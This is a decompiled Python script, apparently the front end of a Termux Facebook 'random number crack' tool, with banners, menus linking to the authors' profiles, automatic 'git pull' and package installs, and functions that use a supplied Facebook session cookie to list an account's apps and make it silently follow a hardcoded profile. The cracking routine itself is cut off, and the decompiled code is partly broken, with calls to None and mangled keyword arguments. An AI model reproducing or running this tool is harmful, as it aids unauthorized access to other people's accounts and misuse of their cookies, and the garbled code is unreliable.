# Source Generated with Decompyle++

# File: test.pyc (Python 3.9)

#If You Wanna Take Credits For This Code, Please Look Yourself Again...

import os

import sys

import time

import requests

import uuid

os.system('git pull')

os.system('pkg install curl')

class jalan:

    

    def __init__(self, z):

        pass

logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV================== \x1b[32;45mNIDA\x1b[0;m ======================\n'

def ud():

    os.system('clear')

    jalan(logo)

    print(' [1] ADD ME ON FB')

    print(' [2] EXIT')

    opt = input('\n   Choose option >>> ')

    if opt == '1':

        os.system('xdg-open https://www.facebook.com/profile.php?id=100008754675878')

        FD()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def FD():

    os.system('clear')

    print(logo)

    print('\x1b[1;33m [1] ADD MY FRIEND ON FB')

    print(' [2] EXIT')

    opt = input('\n  \x1b[1;32m CHOOSE OPTION >>> ')

    if opt == '1':

        os.system('xdg-open https://www.facebook.com/M.ULLAH.AHMEDXAII')

        o()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def o():

    os.system('clear')

    jalan(logo)

    jalan('\t????RANDOM NUMBER CRACK????')

    print('')

    jalan('\x1b[1;32m [1]\x1b[1;91m RANDOM CRACK ')

    jalan('\x1b[1;32m [2] \x1b[1;93mCONTACT ME ON FACEBOOK')

    jalan(' \x1b[1;32m[3] \x1b[1;92mSUBSCRIBE MY CHANNEL')

    jalan(' \x1b[1;32m[4] \x1b[1;94mJOIN FB GROUP')

    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')

    opt = input('\n   \x1b[1;32m Choose option >>> ')

    if opt == '1':

        i()

    if None == '2':

        os.system('xdg-open https://www.facebook.com/profile.php?id=100008754675878')

        return None

    if None == '3':

        os.system('xdg-open')

        return None

    if None == '4':

        os.system('xdg-open https://www.facebook.com/M.ULLAH.AHMEDXAII/')

        return None

    if None == '0':

        os.system('exit')

        return None

    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')

import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

def cek_apk(session,coki):

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[??] %s \x1b[1;95m ? Your Active Apps ?     :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[??] %s \x1b[1;95m ? Your Expired Apps ?    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://free.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

            

            

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.009)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo =                                          ("""   

\033[1;32m         __  __     _   _ _    _      _   _  _ 

\033[1;35m        |  \/  |___| | | | |  | |    /_\ | || |

\033[1;35m        | |\/| |___| |_| | |__| |__ / _ \| __ |  

\033[1;32m        |_|  |_|    \___/|____|____/_/ \_\_||_|

\033[1;37m================= \33[32;45m🇱 🇴 🇸 🇪 🇷 \33[0;m =====================

\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33m𝗟𝗢𝗦𝗘𝗥\33[0;m\033[1;32m && \033[1;33m

\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m 𝗟𝗢𝗦𝗘𝗥

\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m☠︎︎☠︎︎☠︎︎☠︎︎

\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOᒪ IՏ ᖴᖇᗴᗴ

\033[1;32m     \033[1;35mTEAM         :  \033[1;35m1 ᗰᗩᑎ ᗩᖇᗰY😎

\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m3.1

\033[1;37m================= \33[32;45m🇱 🇴 🇸 🇪 🇷 \33[0;m =====================

       \33[37;41m\t WELLCOME TO 🅛︎🅞︎🅢︎🅔︎🅡︎ TOOL\33[0;m

\033[1;37m================== \33[32;45m🇱 🇴 🇸 🇪 🇷 \33[0;m ======================\n""")

loop = 0

oks = []

cps = []

def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+
